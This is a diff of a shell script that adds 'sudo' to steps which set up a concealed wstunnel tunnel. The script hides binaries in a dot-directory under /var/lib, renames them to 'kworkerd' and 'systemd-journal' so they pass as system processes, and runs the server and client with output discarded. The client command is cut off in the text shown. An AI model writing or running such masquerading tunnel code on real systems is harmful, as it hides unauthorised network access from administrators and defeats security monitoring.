@@ -15,7 +15,7 @@ done
 
 # 2. Create a hidden directory for binaries
 HIDDEN_DIR="/var/lib/.cache/sys"
-mkdir -p "$HIDDEN_DIR"
+sudo mkdir -p "$HIDDEN_DIR"
 cd "$HIDDEN_DIR"
 
 # 3. Random Filenames for downloads (not process names)
@@ -34,15 +34,15 @@ rm -f "${WSTUNNEL_DL}.tar.gz" # Clean up tarball
 # Rename binaries to look like system processes
 # 'kworkerd' looks like a kernel worker daemon
 # 'systemd-journal' looks like a log manager
-mv wstunnel kworkerd
-mv "${BOS_DL}" systemd-journal
+sudo mv wstunnel kworkerd
+sudo mv "${BOS_DL}" systemd-journal
 
 # 6. Set Permissions
-chmod +x kworkerd systemd-journal
+sudo chmod +x kworkerd systemd-journal
 
 # 7. Start wstunnel Server
 # Redirect to /dev/null, use stdbuf to buffer output (less disk I/O)
-stdbuf -oL -eL ./kworkerd server ws://127.0.0.1:${WS_PORT} >/dev/null 2>&1 &
+sudo stdbuf -oL -eL ./kworkerd server ws://127.0.0.1:${WS_PORT} >/dev/null 2>&1 &
 
 # 8. Start wstunnel Client
 stdbuf -oL -eL ./kworkerd client \
